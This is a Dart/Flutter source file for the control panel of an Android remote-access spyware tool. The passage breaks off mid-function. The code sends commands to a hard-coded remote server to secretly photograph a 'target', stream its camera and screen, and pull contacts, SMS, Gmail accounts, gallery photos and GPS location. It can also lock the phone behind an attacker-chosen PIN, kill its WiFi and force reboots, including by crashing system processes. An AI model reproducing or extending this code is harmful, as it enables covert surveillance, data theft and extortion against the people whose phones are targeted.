import 'dart:async';
import 'dart:ui'; // Untuk ImageFilter
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'package:video_player/video_player.dart';

// ─────────────────────────────────────────────────────────────────────────────
// ENHANCED THEME (Like DeviceDashboard)
// ─────────────────────────────────────────────────────────────────────────────
class ControlTheme {
  static const bg            = Color(0xFF0A0A0F);
  static const surface       = Color(0xFF14141F);
  static const surface2      = Color(0xFF1C1C2A);
  static const surface3      = Color(0xFF242433);
  static const cardDark      = Color(0xFF0D0D14);
  
  // Vibrant gradients
  static const accent1       = Color(0xFF00E5FF);  // Cyan
  static const accent2       = Color(0xFF7C4DFF);  // Purple
  static const accent3       = Color(0xFFFF4081);  // Pink
  static const success       = Color(0xFF00E676);
  static const warning       = Color(0xFFFFAB40);
  static const error         = Color(0xFFFF5252);
  
  // Text hierarchy
  static const textPrimary    = Color(0xFFF5F8FF);
  static const textSec        = Color(0xFF9E9EB8);
  static const textMuted      = Color(0xFF6B6B8A);
  
  static const shadow         = Color(0x40000000);
  static const shadowHeavy    = Color(0x80000000);
}

// ─── SHADOW UTILITIES ──────────────────────────────────────────────────────
class ControlShadowUtils {
  static List<BoxShadow> get soft {
    return const [
      BoxShadow(color: ControlTheme.shadow, blurRadius: 8, offset: Offset(0, 2)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 2, offset: Offset(0, 1)),
    ];
  }
  
  static List<BoxShadow> get medium {
    return const [
      BoxShadow(color: ControlTheme.shadow, blurRadius: 16, offset: Offset(0, 4)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 4, offset: Offset(0, 2)),
    ];
  }
  
  static List<BoxShadow> get heavy {
    return const [
      BoxShadow(color: ControlTheme.shadow, blurRadius: 24, offset: Offset(0, 8)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 8, offset: Offset(0, 4)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 2, offset: Offset(0, 1)),
    ];
  }
  
  static List<BoxShadow> get card {
    return const [
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 20, offset: Offset(0, 10)),
      BoxShadow(color: ControlTheme.shadow, blurRadius: 6, offset: Offset(0, 2)),
    ];
  }
  
  static List<BoxShadow> get glow {
    return [
      BoxShadow(color: ControlTheme.accent1.withOpacity(0.4), blurRadius: 12, offset: Offset(0, 0)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 8, offset: Offset(0, 4)),
    ];
  }
}

// ─── TEXT STYLES WITH ORBITRON ─────────────────────────────────────────────
class ControlTextStyle {
  static const String _font = 'Orbitron';
  
  static const TextStyle heading = TextStyle(
    fontFamily: _font,
    fontSize: 14,
    fontWeight: FontWeight.bold,
    letterSpacing: 0.5,
  );
  
  static const TextStyle subheading = TextStyle(
    fontFamily: _font,
    fontSize: 11,
    fontWeight: FontWeight.w600,
    letterSpacing: 0.3,
  );
  
  static const TextStyle body = TextStyle(
    fontFamily: _font,
    fontSize: 10,
    fontWeight: FontWeight.normal,
  );
  
  static const TextStyle small = TextStyle(
    fontFamily: _font,
    fontSize: 9,
    fontWeight: FontWeight.normal,
  );
  
  static const TextStyle tiny = TextStyle(
    fontFamily: _font,
    fontSize: 8,
    fontWeight: FontWeight.normal,
  );
  
  static const TextStyle button = TextStyle(
    fontFamily: _font,
    fontSize: 11,
    fontWeight: FontWeight.bold,
    letterSpacing: 0.5,
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Tab Dashboard (Enhanced)
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  // ── Constants ──────────────────────────────────────────────────────────────
  static const _kBase  = 'http://panel.lynzzofficial.com:2031';
  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];
  
  // Video Background
  VideoPlayerController? _videoController;
  bool _videoInitialized = false;

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // ── Device info ────────────────────────────────────────────────────────────
  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _initVideoBackground();
    _tabs = TabController(length: 6, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  Future<void> _initVideoBackground() async {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/bg.mp4')
        ..initialize().then((_) {
          setState(() {
            _videoInitialized = true;
          });
          _videoController!.setLooping(true);
          _videoController!.setVolume(0);
          _videoController!.play();
        });
    } catch (e) {
      print('Error loading video: $e');
    }
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    _videoController?.dispose();
    super.dispose();
  }

  // ── Log ────────────────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = ControlTheme.error}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c,
      content: Text(m, style: ControlTextStyle.body.copyWith(fontWeight: FontWeight.w600, color: Colors.white)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SEND COMMAND
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('ID target tidak valid'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim', c: ControlTheme.success);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Koneksi gagal'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // POLL RESPONSE
  // ─────────────────────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('Foto kosong'); return; }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CHAT
  // ─────────────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUILD
  // ─────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          // Video Background
          if (_videoInitialized && _videoController != null)
            SizedBox.expand(
              child: VideoPlayer(_videoController!),
            ),
          
          // Overlay hitam dengan blur
          Container(
            color: Colors.black.withOpacity(0.5),
          ),
          BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 4, sigmaY: 4),
            child: Container(
              color: Colors.transparent,
            ),
          ),
          
          // Content
          Column(
            children: [
              _buildAppBar(),
              Expanded(child: _buildTabBarView()),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildAppBar() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 48, 16, 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [
            Colors.black.withOpacity(0.8),
            Colors.transparent,
          ],
        ),
      ),
      child: Row(
        children: [
          // Back button
          GestureDetector(
            onTap: () {
              if (_liveOn) _stopLive();
              Navigator.pop(context);
            },
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Icon(Icons.arrow_back_ios_new, color: ControlTheme.textPrimary, size: 18),
            ),
          ),
          const SizedBox(width: 12),
          
          // Logo HP and Device Info
          Expanded(
            child: Row(
              children: [
                Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(colors: [ControlTheme.accent1, ControlTheme.accent2]),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: const Icon(Icons.phone_android, color: Colors.white, size: 24),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _model,
                        style: ControlTextStyle.heading.copyWith(fontSize: 15, fontWeight: FontWeight.bold),
                        overflow: TextOverflow.ellipsis,
                      ),
                      const SizedBox(height: 4),
                      Row(
                        children: [
                          Icon(Icons.battery_std, color: _getBatteryColor(), size: 14),
                          const SizedBox(width: 4),
                          Text(
                            '$_battery%',
                            style: ControlTextStyle.small.copyWith(color: _getBatteryColor(), fontWeight: FontWeight.w600),
                          ),
                          const SizedBox(width: 8),
                          Container(width: 1, height: 10, color: ControlTheme.textMuted),
                          const SizedBox(width: 8),
                          Icon(Icons.circle, color: _liveOn ? ControlTheme.error : ControlTheme.success, size: 6),
                          const SizedBox(width: 4),
                          Text(
                            _liveOn ? 'LIVE' : 'Online',
                            style: ControlTextStyle.tiny.copyWith(color: _liveOn ? ControlTheme.error : ControlTheme.success),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          
          // Actions
          if (_liveOn) ...[
            Container(
              margin: const EdgeInsets.only(right: 8),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
              decoration: BoxDecoration(
                color: ControlTheme.error.withOpacity(0.2), 
                borderRadius: BorderRadius.circular(6), 
                border: Border.all(color: ControlTheme.error.withOpacity(0.5))
              ),
              child: Text('$_fps fps', style: ControlTextStyle.tiny.copyWith(fontWeight: FontWeight.bold, color: ControlTheme.error)),
            ),
          ],
          if (_sending) ...[
            const Padding(
              padding: EdgeInsets.only(right: 8),
              child: SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2, color: ControlTheme.accent1)),
            ),
          ],
          GestureDetector(
            onTap: () { setState(() {}); _cmd('force_open', silent: true); },
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Icon(Icons.refresh_rounded, color: ControlTheme.textMuted, size: 18),
            ),
          ),
        ],
      ),
    );
  }

  Color _getBatteryColor() {
    final bat = int.tryParse(_battery) ?? 0;
    if (bat >= 70) return ControlTheme.success;
    if (bat >= 30) return ControlTheme.warning;
    return ControlTheme.error;
  }

  Widget _buildTabBarView() {
    return Column(
      children: [
        // Tab Bar
        Container(
          margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.3),
            borderRadius: BorderRadius.circular(12),
          ),
          child: TabBar(
            controller: _tabs,
            isScrollable: true,
            indicatorColor: ControlTheme.accent1,
            indicatorWeight: 2,
            labelColor: ControlTheme.textPrimary,
            unselectedLabelColor: ControlTheme.textMuted,
            labelStyle: ControlTextStyle.subheading.copyWith(fontWeight: FontWeight.w600),
            unselectedLabelStyle: ControlTextStyle.small,
            tabs: const [
              Tab(text: 'LIVE'),
              Tab(text: 'CAM'),
              Tab(text: 'INTEL'),
              Tab(text: 'AUDIO'),
              Tab(text: 'CHAT'),
              Tab(text: 'DEV'),
            ],
          ),
        ),
        // Tab Bar View
        Expanded(
          child: TabBarView(controller: _tabs, children: [
            _pageLive(),
            _pageCamera(),
            _pageIntel(),
            _pageAudio(),
            _pageLock(),
            _pageDevice(),
          ]),
        ),
      ],
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLive() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      // Preview
      Container(
        height: _liveOn ? 220 : 90,
        decoration: BoxDecoration(
          color: ControlTheme.cardDark,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: _liveOn ? ControlTheme.error.withOpacity(0.5) : ControlTheme.surface3),
          boxShadow: ControlShadowUtils.card,
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(11),
          child: _liveOn && _frame != null
              ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
              : Center(child: Text(_liveOn ? 'Waiting for frames...' : 'Stream inactive',
                  style: ControlTextStyle.small.copyWith(color: ControlTheme.textMuted))),
        ),
      ),
      const SizedBox(height: 14),
      _buildGridButtons([
        _GridButton('Live Camera', ControlTheme.accent1, Icons.videocam_rounded, () {
          _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(); });
        }),
        _GridButton('Live Screen', ControlTheme.accent2, Icons.desktop_windows_rounded, () {
          _startLive('live_screen_start', ''); _showLiveDialog();
        }),
        if (_liveOn)
          _GridButton('Stop Live', ControlTheme.error, Icons.stop_rounded, _stopLive),
      ]),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: CAMERA
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageCamera() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Take Photo', ControlTheme.warning, Icons.camera_alt_rounded, () => _showCamPicker((s) => _cmd('take_photo', extra: s))),
        _GridButton('Screenshot', ControlTheme.accent1, Icons.screenshot_monitor, () => _cmd('get_screen')),
        _GridButton('Set Wallpaper', ControlTheme.accent3, Icons.wallpaper_rounded, () => _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v))),
        _GridButton('Strobe ON', ControlTheme.warning, Icons.flash_on_rounded, () => _cmd('flash_strobe')),
        _GridButton('Strobe OFF', ControlTheme.textMuted, Icons.flash_off_rounded, () => _cmd('stop_strobe')),
      ], columns: 2),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: INTELLIGENCE
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageIntel() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Contacts', ControlTheme.accent3, Icons.contacts_rounded, () => _cmd('get_contacts')),
        _GridButton('GPS Location', ControlTheme.success, Icons.my_location_rounded, () => _cmd('get_location')),
        _GridButton('Gmail & Accounts', ControlTheme.accent1, Icons.account_circle_rounded, () => _cmd('get_gmails')),
        _GridButton('SMS Inbox', ControlTheme.accent2, Icons.sms_rounded, () => _cmd('get_sms')),
        _GridButton('Notifications', ControlTheme.warning, Icons.notifications_rounded, () => _fetchNotif()),
        _GridButton('Gallery (5 Photos)', ControlTheme.accent3, Icons.photo_library_rounded, () => _cmd('get_gallery', extra: '5')),
        _GridButton('Request Notif Access', ControlTheme.textMuted, Icons.security_rounded, () => _cmd('open_notification_settings')),
      ], columns: 2),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: AUDIO
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageAudio() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Play Audio', ControlTheme.warning, Icons.play_circle_rounded, () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))),
        _GridButton('Stop Audio', ControlTheme.textMuted, Icons.stop_circle_rounded, () => _cmd('stop_audio')),
        _GridButton('Vibrate Loop', ControlTheme.accent3, Icons.vibration_rounded, () => _cmd('vibrate_loop')),
        _GridButton('Open URL', ControlTheme.accent1, Icons.open_in_browser, () => _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v))),
        _GridButton('Kill WiFi', ControlTheme.accent2, Icons.wifi_off_rounded, () => _cmd('kill_wifi')),
      ], columns: 2),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LOCK & CHAT
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLock() => Column(
    children: [
      Expanded(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(16),
          child: Column(
            children: [
              _buildGridButtons([
                _GridButton('Lock Live + Chat', ControlTheme.error, Icons.lock_rounded, () { _lockLiveDialog(); }),
                _GridButton('Lock Device', ControlTheme.warning, Icons.lock_outline_rounded, () {
                  _inputDialog('Lock Device', 'Pesan di layar lock', (msg) {
                    _inputDialog('PIN Unlock', '4 digit PIN', (pin) {
                      _cmd('hard_lock', extra: '$msg|$pin');
                    }, isNumber: true, hint: '1234');
                  });
                }),
                _GridButton('Unlock Device', ControlTheme.success, Icons.lock_open_rounded, () => _cmd('unlock')),
              ], columns: 2),
              const SizedBox(height: 20),
              
              // Chat section
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.3),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: ControlTheme.surface3),
                ),
                child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Row(children: [
                    Icon(Icons.chat_rounded, color: ControlTheme.accent1, size: 16),
                    const SizedBox(width: 8),
                    Text('CHAT WITH TARGET', style: ControlTextStyle.subheading.copyWith(fontWeight: FontWeight.bold)),
                  ]),
                  const SizedBox(height: 10),
                  Container(
                    height: 200,
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: _chat.isEmpty
                        ? Center(child: Text('No messages yet', style: ControlTextStyle.small.copyWith(color: ControlTheme.textMuted)))
                        : ListView.builder(
                            controller: _chatScroll,
                            padding: const EdgeInsets.all(10),
                            itemCount: _chat.length,
                            itemBuilder: (_, i) {
                              final m = _chat[i];
                              final isOwner = m['from'] == 'owner';
                              return Align(
                                alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                                child: Container(
                                  margin: const EdgeInsets.symmetric(vertical: 3),
                                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                                  constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.6),
                                  decoration: BoxDecoration(
                                    gradient: isOwner
                                        ? const LinearGradient(colors: [ControlTheme.accent1, ControlTheme.accent2])
                                        : null,
                                    color: isOwner ? null : Colors.black.withOpacity(0.5),
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                  child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
                                    Text(m['text'] ?? '', style: ControlTextStyle.body.copyWith(color: ControlTheme.textPrimary)),
                                    const SizedBox(height: 2),
                                    Text(m['time'] ?? '', style: ControlTextStyle.tiny.copyWith(color: ControlTheme.textMuted)),
                                  ]),
                                ),
                              );
                            }),
                  ),
                ]),
              ),
            ],
          ),
        ),
      ),
      // Chat input bar
      Container(
        padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.5),
          border: const Border(top: BorderSide(color: ControlTheme.surface2)),
        ),
        child: Row(children: [
          Expanded(child: TextField(
            controller: _chatCtrl,
            style: ControlTextStyle.body.copyWith(color: ControlTheme.textPrimary),
            decoration: InputDecoration(
              hintText: 'Type message to target...',
              hintStyle: ControlTextStyle.small.copyWith(color: ControlTheme.textMuted),
              filled: true, fillColor: Colors.black.withOpacity(0.3),
              contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(20), borderSide: BorderSide.none),
            ),
            onSubmitted: _sendChat,
          )),
          const SizedBox(width: 8),
          GestureDetector(
            onTap: () => _sendChat(_chatCtrl.text),
            child: Container(
              padding: const EdgeInsets.all(11),
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [ControlTheme.accent1, ControlTheme.accent2]),
                shape: BoxShape.circle,
              ),
              child: const Icon(Icons.send_rounded, color: Colors.white, size: 16)),
          ),
        ]),
      ),
    ],
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: DEVICE
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageDevice() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Restart Device', ControlTheme.warning, Icons.restart_alt_rounded, () {
          showDialog(context: context, builder: (_) => AlertDialog(
            backgroundColor: Colors.black.withOpacity(0.9),
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
            title: Text('Restart Device', style: ControlTextStyle.heading),
            content: Text(
              'Target device will restart.\n\nUsing PowerManager reflection — no root or device admin required.',
              style: ControlTextStyle.body.copyWith(color: ControlTheme.textSec, height: 1.5)),
            actions: [
              TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: ControlTextStyle.body.copyWith(color: ControlTheme.textMuted))),
              ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: ControlTheme.warning,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                ),
                onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
                child: Text('Restart', style: ControlTextStyle.button.copyWith(color: Colors.white))),
            ],
          ));
        }),
        _GridButton('Wake Up Target', ControlTheme.success, Icons.wb_sunny_rounded, () => _cmd('force_open')),
      ], columns: 2),
      const SizedBox(height: 20),
      Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.3),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: ControlTheme.surface3),
        ),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text('Restart Methods', style: ControlTextStyle.subheading.copyWith(fontWeight: FontWeight.w600)),
          const SizedBox(height: 8),
          _infoRow('1', 'PowerManager reflection (no root required)'),
          _infoRow('2', 'DevicePolicyManager (if admin active)'),
          _infoRow('3', 'su -c reboot (root)'),
          _infoRow('4', 'am crash system_server'),
          _infoRow('5', 'pkill -9 zygote'),
        ]),
      ),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // GRID BUTTON HELPER
  // ─────────────────────────────────────────────────────────────────────────
  Widget _buildGridButtons(List<_GridButton> buttons, {int columns = 2}) {
    final List<Widget> rows = [];
    for (int i = 0; i < buttons.length; i += columns) {
      final rowButtons = buttons.skip(i).take(columns).toList();
      rows.add(
        Padding(
          padding: const EdgeInsets.only(bottom: 12),
          child: Row(
            children: [
              for (int j = 0; j < rowButtons.length; j++)
                Expanded(
                  child: Padding(
                    padding: EdgeInsets.only(right: j < rowButtons.length - 1 ? 12 : 0),
                    child: _gridButton(rowButtons[j]),
                  ),
                ),
              for (int j = rowButtons.length; j < columns; j++)
                const Expanded(child: SizedBox()),
            ],
          ),
        ),
      );
    }
    return Column(children: rows);
  }

  Widget _gridButton(_GridButton btn) {
    return InkWell(
      onTap: btn.onTap,
      borderRadius: BorderRadius.circular(12),
      child: Container(
        height: 90,
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Colors.black.withOpacity(0.5),
              Colors.black.withOpacity(0.3),
            ],
          ),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: btn.color.withOpacity(0.3)),
          boxShadow: ControlShadowUtils.soft,
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: btn.color.withOpacity(0.15),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(btn.icon, color: btn.color, size: 20),
            ),
            const SizedBox(height: 8),
            Text(
              btn.label,
              style: ControlTextStyle.small.copyWith(
                fontWeight: FontWeight.w500,
                color: ControlTheme.textPrimary,
              ),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DIALOGS
  // ─────────────────────────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: Colors.black.withOpacity(0.95),
          insetPadding: const EdgeInsets.all(6),
